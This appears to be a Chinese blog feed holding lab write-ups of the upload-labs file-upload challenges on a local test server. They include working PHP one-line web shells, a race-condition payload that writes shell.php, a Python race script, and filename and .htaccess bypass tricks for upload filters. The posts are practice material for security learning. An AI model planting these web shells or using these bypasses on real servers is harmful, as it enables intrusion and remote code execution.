<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(); @eval($_POST[&#x27;shell&#x27;]); ?&gt;   写入到b.txt</span><br><span class="line">将文件后缀改为png</span><br></pre></td></tr></table></figure>
<p>和上一个步骤一样，上传文件。<br>然后测试 <code>127.0.0.1/upload-labs/upload/b.php</code><br>显示成功。<br>我们可以打开蚁剑。点击鼠标右键-&gt;添加数据<br>“URL地址”填写测试的地址，连接密码自己任意设定。如果不放心，点右上角的“测试连接”，成功代表无问题，最后左上角“添加”。<br>创建成功后，右键点击我们创建的这条数据，再点“虚拟终端”，输入dir可看到目录中存在我们的php文件。</p>
</li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><p>由于白名单函数是在JavaScript中运行，所以可以禁用或修改JavaScript来关闭白名单，这样就可以直接把目标文件上传到服务器。<br>比如在Firefox中打开about:config，然后搜索javascript.enabled  默认是true，即使用JavaScript。可以修改为false禁用。<br>或者按F12，修改白名单的源码保存。（不推荐，实际用处不大）</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曲曲折折走了些弯路，幸好最后成功了，不过先看点教学视频也许会上手更快。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Xionghuimin/article/details/106506988#:~:text=%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%89%93%E5%BC%80%20%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%20%EF%BC%8C%E5%A2%9E%E5%8A%A0%20%E6%95%B0%E6%8D%AE%20%EF%BC%8C%E7%84%B6%E5%90%8E%E5%A1%AB%E5%86%99URL%20%E5%9C%B0%E5%9D%80%20%EF%BC%8C%E5%A1%AB%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%80%BC%20%E4%B8%BA%E7%A9%BA%20%EF%BC%8C%E4%B8%8D%E8%A6%81%E7%9D%80%E6%80%A5%EF%BC%8C%E5%8F%AA%E8%A6%81%E4%BD%A0%E5%A6%82%E4%B8%8B%E5%A1%AB%E5%86%99%E5%B0%B1%E8%A1%8C%E3%80%82%20%E5%89%8D%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%E7%9A%84IP%20%E5%9C%B0%E5%9D%80%20%EF%BC%8C%E5%90%8E%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%20%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%20%E7%9A%84%E4%BD%8D%E7%BD%AE%E3%80%82">文件上传漏洞—蚁剑连接地址错误、一句话木马php语法错误</a><br><a href="https://blog.csdn.net/hexiaan/article/details/127054253">upload-labs Pass-01</a><br><a href="https://blog.csdn.net/wo41ge/article/details/107313203">upload-labs 21关大合集</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs以及蚁剑安装</title>
    <url>/2022/11/23/upload-labs+%E8%9A%81%E5%89%91install/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>安装这个两个东西，其实还是有点麻烦的，于我而言。所以我打算记录一下。</p>
<span id="more"></span>
<h1 id="蚁剑安装"><a href="#蚁剑安装" class="headerlink" title="蚁剑安装"></a><strong>蚁剑安装</strong></h1><p>首先我们要获取蚁剑–&gt;<a href="https://www.yuque.com/antswordproject/antsword/srruro">获取蚁剑</a><br>点击里面的链接“获取加速器”<br>先自己建立一个AntSword目录并在该目录里建立antsword_project目录，然后下载自己所需的版本，解压。<br>之后再点击解压后的AntSword.exe文件，记得用<strong>管理员方式</strong>打开，初始化，选择antsword_project空目录作为蚁剑的工作目录。<br>如果之前已经有了蚁剑源代码，可以在这一步选择工作目录的时候，直接选择该目录作为工作目录。</p>
<h1 id="upload-labs配置"><a href="#upload-labs配置" class="headerlink" title="upload-labs配置"></a>upload-labs配置</h1><p>官方地址：<a href="https://github.com/c0ny1/upload-labs">upload-labs</a><br>按照提示进行即可。<br>推荐的PHP5.2.117，PHP官方已经没有下载地址了，所以我们可以另找一个。<br><a href="https://www.cnblogs.com/endv/p/7743472.html">PHP5.2.17下载链接</a><br>选择其中的php-5.2.17-nts-Win32.zip下载即可。<br>解压后，把php.ini-recommended改成php.ini<br>然后把解压后的所有文件放在phpstudy的PHP目录下(默认安装了phpstudy)，这样就完成了。<br>如果Windows，点击下载地址链接，选择其中的Source code下载即可（有phpstudy的话）。<br>将其转移到phpstudy下的WWW目录，把upload-labs-masters目录名改为upload-labs。<br>并在其下建立一个upload，作为其存放上传文件的目录。<br>网站测试：<br>启动phpstudy，网页输入：127.0.0.1&#x2F;upload-labs<br>如果成功显示正常页面就基本没问题了。</p>
]]></content>
      <categories>
        <category>upload-labs</category>
        <category>蚁剑</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>upload-labs</tag>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_11-16</title>
    <url>/2022/11/26/upload-labs_11-16/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在sqli-labs中类似的绕过</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第11关"><a href="#第11关" class="headerlink" title="第11关"></a>第11关</h2><p>抓包将后缀名改成双写即可绕过，即1.pphphp<br>成功绕过</p>
<h2 id="第12关"><a href="#第12关" class="headerlink" title="第12关"></a>第12关</h2><p>抓包后，在save_path处修改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../upload/b.php%00    通过%00截断的方式强行上传</span><br></pre></td></tr></table></figure>
<p>同时将file_name改为b.png<br>成功绕过</p>
<h2 id="第13关"><a href="#第13关" class="headerlink" title="第13关"></a>第13关</h2><p>先上传一个php文件，发现显示报错，那么是白名单模式<br>我们再上传一次抓包，然后发现是POST请求，那么就可以通过截断方式<br>首先，将b.php改为b.png<br>然后，将save_path处的路径改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../upload/b.php (最后有一个空格)</span><br></pre></td></tr></table></figure>
<p>将这个空格在Hex中从20改为00<br>最后放包。<br>成功绕过</p>
<h2 id="第14关"><a href="#第14关" class="headerlink" title="第14关"></a>第14关</h2><p>这道题主要检测的是文件头，我们上传的所有文件都会被转化为图片格式，我们需要上传一句话图片木马，如下图，将文件后缀改为php上传成功，但返回的为jpg格式文件。<br>这道题需要使用图片一句话木马。那么首先我们需要做一个出来。<br>在目录下，放一张b.jpg图片，再放一个b.php文件。然后在该目录下输入cmd命令，输入以下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy b.jpg/b+b.php/a b.jpg</span><br></pre></td></tr></table></figure>
<p>然后再把文件上传<br>之后打开页面的“文件包含漏洞”链接。然后在地址栏后输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=upload/7920221126210455.jpg   数字是该文件上传后具有的</span><br></pre></td></tr></table></figure>
<p>成功绕过</p>
<h2 id="第15关"><a href="#第15关" class="headerlink" title="第15关"></a>第15关</h2><p>源码中出现了getimagesize函数。<br>getimagesize — 取得图像大小。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 false 并产生一条 E_WARNING 级的错误。<br>因为我们上传的的确是一张图片，所以可以使用和第14关的方法。<br>成功绕过</p>
<h2 id="第16关"><a href="#第16关" class="headerlink" title="第16关"></a>第16关</h2><p>操作和前2关是一样的。<br>但这里需要打开php.ini文件里的php_exif.dll，如果打开后找不到，尝试更换PHP版本。<br>成功绕过</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实难度相对简单，这几关和编程关联并不大，只是需要知道应该怎么做。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a><br><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_18+19</title>
    <url>/2022/11/27/upload-labs_18+19/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关burp发挥的作用很大</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>这一关的提示是代码审计，通过尝试，可以发现，是白名单验证的方式。<br>代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。<br>那么我们的方法是：尝试使用竞争条件上传，用burp一直上传文件，用python脚本一直方位临时文件，临时文件内容为我们写入一句话到它的目录。<br>其中python脚本如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">            test = requests.get(<span class="string">&quot;http://192.168.44.129:9096/upload/upload/success.php&quot;</span>)         //写入上传位置路径地址</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;260ca9dd8a4577fc00b7bd5810298076&quot;</span> <span class="keyword">in</span> test.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>上传的文件内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(success);</span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_REQUEST[123])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用burp抓包-&gt;发送到Intruder<br><img src="/simg/upload-labs_18.png" alt=" "><br>Intruder中-&gt;Payloads  修改为如图所示<br><img src="/simg/upload-labs_18_2.png" alt=" "><br>最后同时运行python脚本和burp的start attack<br>则运行成功。</p>
<h2 id="第19关"><a href="#第19关" class="headerlink" title="第19关"></a>第19关</h2><p>也是和18关原理相同</p>
<p>这2关可以参考这个博客的另一个方法<br><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">17,18</a></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我自己觉得这两关是完成的不太好的，有各种各样的因素，以后再来补充吧~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>burp</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_17</title>
    <url>/2022/11/26/upload-labs_17/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从17关开始，就变得有挑战性了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第17关"><a href="#第17关" class="headerlink" title="第17关"></a>第17关</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>imagecreatefromjpeg — 由文件或 URL 创建一个新图象<br>imagecreatefromjpeg() 返回一图像标识符，代表了从给定的文件名取得的图像<br>二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符&#x2F;图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。<br>按照原来的方法进行上传，我们可以发现还是可以上传的，但是配合包含漏洞却无法解析，这时我们把上传的图片复制下来用Notepad++打开，发现我们原来写的php代码没有了，这就是二次渲染把我们里面的php代码删掉了。<br>注意，使用Notepad++查看16进制需要安装一个插件：HEX-Editor<br>安装方法：打开Notepad++，在主页面上方找到（插件），然后（插件管理），在可用下搜索 Hex，下载即可。<br>使用方法：打开目标文件，找到（插件）-&gt; Hex-Editor -&gt; View in HEX<br>把原图和它修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，配合包含漏洞，就可以了。<br>具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的，知道怎么解就可以了。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不要只是按照操作，多想想原理。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/qq_46527080/article/details/111701067">upload-labs17关</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_2</title>
    <url>/2022/11/24/upload-labs_2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关难度也不大，只是涉及到了新的知识点。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试<br>首先可以尝试传输文件。<br>当我传输一个txt文件时，提示类型错误，但这次和第一关不同，不是弹窗，而是页面直接提示，因此不是前端JavaScript验证。<br>这时我们查看源码，可以看到下面这一段：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>从这段代码可以看出，上传文件的途中验证了content-type，并且固定了上传文件类型。这里涉及到了MIME。<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。<br>语法：<br>type&#x2F;subtype<br>用法：<br>客户端：<br>告诉服务端上传文件类型<br>告诉服务端可以接受文件类型<br>服务端：<br>告诉客户端响应数据类型<br>详细参见：<a href="https://www.runoob.com/http/mime-types.html">MIME 类型</a><br>因此可以通过改变content-type来让目标文件上传成功</p>
</li>
<li><p>尝试与抓包<br>burp抓包，将content-type更改为image&#x2F;png，然后放包，我们就看到文件上传成功了。<br>然后打开，显示没问题，最终成功！</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，没什么难度。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_20</title>
    <url>/2022/11/27/upload-labs_20/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关要轻松一些了</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h2><p>截断move_uploaded_file()函数中的img_path是由post参数save_name控制的，可以在save_name利用%00截断(注意php版本低于5.3)<br>具体实现是，上传文件为图片马，将保存文件的名称后缀修改为.php 注意最后有一个空格<br>然后抓包，在Hex里修改空格20为00<br>可以看到上传成功，蚁剑连接也成功</p>
<h2 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h2><p>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 &#x2F;.<br>所以可以抓包，然后在保存文件末尾用&#x2F;.<br>这样我们可以看到，文件同样上传成功，蚁剑也连接成功</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一关的方法要简单一些了，但只是学会了方法，背后的原理仍需掌握。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_21</title>
    <url>/2022/11/27/upload-labs_21/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关用到的是数组绕过</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>这道题需要代码审计，通过审计发现，先检查文件类型，后检查是否上传了文件名没有则为文件的名字，判断是否为数组，若不是则以点分割返回一个数组，取数组最后一位数为后缀，文件保存为reset输出数组第一个数，和最后一位数保存。</p>
<p>具体实现：<br>上传图片马文件，然后保存文件后缀改为php<br>之后抓包，然后如下图所示修改<br><img src="/simg/upload-labs_21.png" alt=" "><br>最后放包，就上传成功了，蚁剑也连接成功</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不仅要会方法，还要懂原理。通过这21关的训练，其实可以发现，白名单比黑名单安全性更高。<br>实战需要自己测试！</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_3</title>
    <url>/2022/11/24/upload-labs_3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>稍微改改就好，就像化了个妆人就认不出了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试<br>首先上传一个php文件，发现失败，显示信息为“提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！”<br>我们可以通过这个错误提示信息看出是黑名单，于是查看源码验证<br>通过源码，可以发现直接进行后缀名过滤，同时删除点，检查大小写去除字符串和空格。<br>但我们注意后缀名过滤的这行代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure>
可以发现并没有过滤完全，因此我们可以通过更改等价后缀名的方式绕过。<br>那么接下来就是查看有哪些等价后缀名：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语言   等价扩展名</span><br><span class="line">asp    asa, cer, cdx</span><br><span class="line">aspx   ashx, asmx, ascx</span><br><span class="line">php    php2, php3, php4, php5, phps, phtml</span><br><span class="line">jsp    jspx, jspf</span><br></pre></td></tr></table></figure>
我们只需要把后缀名改成这些即可。<br>注意，因为默认Apache只解析少数几种后缀格式，所以最好到相应的httpd.conf文件下添加以下语句：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .php5 .php3</span><br></pre></td></tr></table></figure>
意即能够解析<br>AddType 指令 作用：在给定的文件扩展名与特定的内容类型之间建立映射 语法：AddType MIME-type extension<br>[extension] …<br>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。<br>AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。</li>
</ol>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol start="2">
<li>尝试与抓包<br>将文件后缀改为黑名单以外的后缀格式，即可顺利上传。或者通过抓包改后缀名。蚁剑顺利连接</li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><ol start="2">
<li>尝试与抓包<br>上传文件后缀名依旧是php，但通过burp抓包，然后修改filename，采用双写绕过。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php::$DA::$DATATA</span><br></pre></td></tr></table></figure>
这样就能够顺利上传，放到网页上，删除最后的::$data，网页正常打开。再在蚁剑上建立连接，非常顺利。</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天在这一关弄了好久，起因却是一个有点儿离谱的原因。网页能打开，蚁剑却连不上。最后才发现，变量名就是密码，我第一关阴差阳错地对了。但我不知道密码要设为变量名，这一关也是随便一个密码，却一直过不了。最终发现是蚁剑的密码和文件内的变量名不同，谨记。<br>下次尽量避开这种失误。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_4</title>
    <url>/2022/11/24/upload-labs_4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>改变能够改变的，选择能够选择的。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试<br>通过查看源码，我们可以发现，后缀名绕过已经行不通，因此我们需要更换思路。<br>可以尝试用.htaccess绕过。这里涉及到了.htaccess的知识。<br>‘.htaccess’文件相当于一种部分配置文件，好比局部变量一样，只在当前目录生效。比如你设置解析’.txt’解析为’.php’，那么’.htaccess’文件在的子目录中就会执行，而上一级目录不执行。<br>因此可以把目标文件后缀名改为.png，改Apache配置文件httpd.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line"></span><br><span class="line">LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</span><br></pre></td></tr></table></figure>
<p>在该目录下创建.htaccess文件，然后写入如下代码，使得解析时将.jpg解析为.php格式。</p>
<figure class="highlight h"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;b.jpg&quot;</span>&gt;                      <span class="comment">//如果匹配到名为 b.jpg 的文件 就执行该文件</span></span><br><span class="line">       SetHandler  application/x-httpd-php             <span class="comment">//把文件当成php的代码来解析</span></span><br><span class="line">&lt;/FilesMatch&gt;       </span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>上传并尝试执行<br>上传成功，之后蚁剑连接失败。<br>是phpstudy集成环境中 php 的问题<br>因为在小皮面板中php版本是nts意思是即非线程安全，不提供数据访问保护，不支持使用 .htaccess</p>
</li>
</ol>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_5-10</title>
    <url>/2022/11/25/upload-labs_5-10/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…<br>这三关比较像，所以一起写了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h2><p><strong>黑名单过滤（后缀名特殊字符多写）</strong><br>尝试其它都无法成功，因此选择特殊字符重写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php. .         在php后加一个点，加一个空格，再加一个点，上传成功</span><br></pre></td></tr></table></figure>
<p>蚁剑按正常后缀连接成功。</p>
<h2 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h2><p><strong>黑名单过滤（大小写绕过）</strong><br>尝试其它都无法成功，因此选择大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.Php            任意改变php的大小写，上传成功</span><br></pre></td></tr></table></figure>
<p>正常情况下，蚁剑按正常后缀连接成功<br>PS: 我的出问题了，文件能上传，但打开文件时会出现HTTP500错误，没有找到原因，只能重装phpstudy解决</p>
<h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><p><strong>黑名单过滤（空格绕过）</strong><br>尝试其它都无法成功，因此选择空格绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php            在php后加一个空格，上传成功</span><br></pre></td></tr></table></figure>
<p>蚁剑按正常后缀连接成功</p>
<h2 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h2><p><strong>黑名单过滤（点绕过）</strong><br>尝试其它都无法成功，因此选择点绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php.          在php后加一个点，上传成功</span><br></pre></td></tr></table></figure>
<p>蚁剑按正常后缀连接成功</p>
<h2 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h2><p><strong>黑名单过滤（流文件绕过）</strong><br>尝试其它都无法成功，因此选择流文件绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php::$DATA    在php后加::$DATA，上传成功</span><br></pre></td></tr></table></figure>
<p>蚁剑按正常后缀连接成功</p>
